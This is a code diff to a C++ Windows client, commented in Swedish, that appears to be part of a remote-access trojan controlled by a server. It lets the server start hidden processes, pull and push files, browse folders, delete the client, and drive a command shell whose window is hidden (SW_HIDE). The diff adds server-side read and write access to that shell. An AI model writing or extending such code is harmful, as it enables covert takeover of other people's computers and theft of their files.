@@ -9,7 +9,9 @@ response_table client::get_responses()
 	return {
 		{"process-v", payload::process_execution_show}, // för att starta en process
 		{"process-h", payload::process_execution_hidden}, // för att starta en gömd process
-		{"download", payload::download_file} // för att över föra en fil till servern
+		{"download", payload::download_file}, // för att över föra en fil till servern
+		{"shell-read", [&](std::string data) { return std::string(shell.alive() ? (shell.ready() ? "ready" : "alive"): "dead") + "|" + shell.read_once();}}, // läsa från shellen som man skapare via shell-init
+		{"shell-write", [&](std::string data) { return std::string(shell.alive() ? "alive" : "dead") + "|" + (shell.write(data) ? "OK" : "FAIL"); }} // skriv till shellen efter läsning
 	};
 }
 
@@ -17,9 +19,11 @@ action_table client::get_actions()
 {
 	return {
 		{"exit", [&](std::string data) { exit(0); }}, // för att stänga ner klienten
+
 		{"uninstall", [&](std::string) { // för att avinstallera klienten
 			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
 		}},
+
 		{"select", [&](std::string data) { // för att välja fil/mapp åt servern
 			directory manager(data); //antag data är bas directory
 			helper::send_directory(client_implementation, manager.current_directory()); // skicka bas mappen
@@ -35,6 +39,7 @@ action_table client::get_actions()
 				paket = client_implementation.receive_packet(); // ta emot nästa instruktion från servern
 			}
 		}},
+
 		{"upload", [&](std::string data) {
 			auto [file, folder] = helper::ArgSplit(data, '|');
 			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary); // öppna en filen som ska motas
@@ -54,52 +59,24 @@ action_table client::get_actions()
 			output.close(); // stäng filen
 			
 		}},
-		{"shell-init", [&](std::string data)
-		{
-			auto [shell, cwd] = helper::ArgSplit(data, '|');
+
+		{"shell-init", [&](std::string data){
+			auto [process, cwd] = helper::ArgSplit(data, '|');
 
 			properties prop{
-				shell,
+				process,
 				cwd,
 				CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
 				STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
 				SW_HIDE,
 				true
 			};
+			
+			shell = shell_process(prop);
 
-			shell_process process(prop);
-
-			if (process.open()) {
+			if (shell.open()) {
 				client_implementation.send({"shell-status", "OK"});
 				std::cout << "shell-process(" << data << ") -> " << Error(0) << std::endl;
-
-				bool got_input = true;
-
-				std::thread read_pipe(&shell_process::read, process, [&](std::string data) {
-					if (process.ready() && got_input) {
-						client_implementation.send({ "shell-ready", "ready" });
-						got_input = false;
-					}
-					if (!data.empty()) {
-						client_implementation.send({"shell-read", data});
-					}
-				});
-
-				while(process.alive()){
-					packet input = client_implementation.receive_packet();
-					if (input.id == "shell-input" && input.data != "<cbreak>") {
-						process.write(input.data);
-					}
-					else{
-						process.ctrl_c();
-					}
-					got_input = true;
-				}
-
-				read_pipe.join();
-
-				client_implementation.send({ "shell-status", "died" });
-				client_implementation.send({ "shell-ready", "died" });
 			}
 			else {
 				auto error = std::error_code(GetLastError(), std::system_category());
@@ -107,6 +84,6 @@ action_table client::get_actions()
 				client_implementation.send({"shell-status", std::to_string(error.value()) + " -> " + error.message()});
 				return;
 			}
-		}}
+		}},
 	};
 }
